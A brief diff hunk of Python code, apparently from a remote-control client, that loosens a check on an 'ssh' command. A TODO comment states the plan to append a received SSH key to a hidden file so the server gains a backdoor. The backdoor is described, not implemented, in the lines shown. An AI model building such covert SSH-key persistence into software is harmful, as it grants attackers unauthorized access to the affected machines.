@@ -127,7 +127,7 @@ while True:
 				    threads.append(t)
 				    t.start()
 
-			if len(info) == 2 and info[0] == "ssh":
+			if info[0] == "ssh":
 				ssh_key = info[1]
 				## TODO(client side): append the ssh key to _you_should_know_which file
 				##                    so that the server has a backdoor to ssh in
